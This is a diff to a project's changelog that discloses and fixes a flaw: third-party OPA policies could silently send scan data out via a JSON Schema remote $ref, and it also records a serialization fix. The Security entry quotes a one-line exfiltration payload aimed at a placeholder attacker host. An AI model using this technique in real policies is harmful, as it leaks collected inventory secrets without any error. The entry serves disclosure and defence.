@@ -21,6 +21,29 @@ belongs in `git log`.
 
 ## [Unreleased]
 
+### Security
+
+- **A third-party policy could exfiltrate the audited inventory, silently.** Rules
+  hot-loaded through `--policy-dir` are third-party code, run over everything the scan
+  collected. The engine had removed `http.send`, `net.lookup_ip_addr` and `opa.runtime`
+  and said the network was out of reach; that was not true. OPA resolves a JSON
+  Schema's remote `$ref` over HTTP **at evaluation time**, on a path no builtin guards,
+  so one line was enough:
+  `json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [attacker, input.secret])})`.
+  Measured against the pinned scankit v0.2.2 with a witness server: the request left,
+  and `Evaluate` returned **no error** — the silence is the part that mattered.
+  scankit is now pinned to v0.3.1, whose capability set carries `AllowNet: []string{}`
+  (empty and non-nil denies every host), and `TestNoThirdPartyPolicyCanReachTheNetwork`
+  holds a witness against it so a pin regression cannot reopen it quietly.
+
+### Fixed
+
+- **`evidence.proves` no longer travels as `["","",""]` on every result.** `omitempty`
+  on a fixed-size array is a no-op, so a reader could not tell "no proof recorded" from
+  "three proofs recorded, all blank" — including inside sealed bundles archived for
+  later. Fixed upstream in scankit v0.3.1 and guarded here, where the dossiers are
+  published.
+
 ### Added
 
 - **A finding now declares its CONFIDENCE, distinct from its severity.** Severity says
